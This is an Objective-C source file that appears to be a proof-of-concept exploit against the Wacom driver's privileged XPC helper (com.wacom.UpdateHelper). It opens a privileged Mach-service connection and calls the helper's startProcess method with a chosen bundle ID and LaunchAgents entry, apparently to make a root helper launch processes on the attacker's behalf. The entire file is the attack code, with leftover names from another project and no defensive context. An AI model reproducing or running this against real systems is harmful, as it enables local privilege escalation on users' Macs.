//
//  main.m
//  qemuopiium
//
//  Created by tybohan on 8/28/18.
//  Copyright © 2018 tybohan. All rights reserved.
//

#import <Foundation/Foundation.h>

static NSString* kBGMXPCHelperMachServiceName = @"com.wacom.UpdateHelper";

//writeConfig:atPath:withReply:
// The protocol that BGMApp will vend as its XPC API.
@protocol BGMAppXPCProtocol
// "removeItemAtPath:withReply:
//- (void) setTmpDirPath:(NSString*) ans;
- (void) startProcess:(NSDictionary*)arg0 withReply:(NSString*)arg1;
- (void) stopLaunchDProcess:(NSDictionary*)arg0 withReply:(NSString*)arg2;
@end

int main(int argc, const char * argv[]) {
    
        NSString*  _serviceName = kBGMXPCHelperMachServiceName;

        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(BGMAppXPCProtocol)]];
        [_agentConnection resume];
        
        id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError *err) {
            NSLog(@"got an error: %@", err);
        }];
//        [obj retain];
        NSLog(@"obj: %@", obj);
        NSLog(@"conn: %@", _agentConnection);
    NSArray *cc = @[@"com.wacom.DataStoreMgr"];
//    NSDictionary *dict = @{ @"BundleID" : @"com.wacom.WacomMultiTouch", @"LaunchAgents": cc};
    NSDictionary *dict = @{ @"BundleID" : @"com.google.android.mtpviewer", @"LaunchAgents": cc};

//    [obj stopLaunchDProcess:dict withReply:nil];
    [obj startProcess:dict withReply:nil];

            
    return 0;
}
